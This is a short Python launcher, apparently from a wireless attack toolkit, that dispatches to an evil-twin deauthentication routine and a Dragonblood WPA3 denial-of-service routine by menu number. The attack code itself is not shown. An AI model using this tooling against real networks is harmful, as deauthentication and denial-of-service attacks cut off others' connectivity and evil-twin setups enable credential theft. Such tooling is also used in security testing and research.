
import attack.attacks.evilTwin as evilTwin
from attack.attacks import dragonblood

def run(params):
    if params[0] == "1":
        if len(params) < 2:
            print("invalid number of parameters for Evil Twin Attack.")
            return
        evilTwin.transmit_frame_deauth(params[1:])
    elif params[0] == "2":
        if len(params) < 4:
            print("Invalid number of parameters for Dragonblood DoS attack.")
            return
        dragonblood.start_dos(params[1:])